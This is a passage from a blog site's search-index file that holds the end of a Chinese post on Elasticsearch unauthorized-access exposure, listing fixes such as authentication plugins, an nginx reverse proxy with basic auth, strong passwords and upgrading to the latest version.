aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/el%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E1.png"></p><h3 id="修复方案：-18"><a href="#修复方案：-18" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]&#x2F;repo-name。同时需要注意增加验证后，请勿使用弱口令。</p><p>2、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。</p><p>3、elasticsearch 早期版本在“CVE中文漏洞信息库”网站上已有部分漏洞被披露，建议使用最新版本程序。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
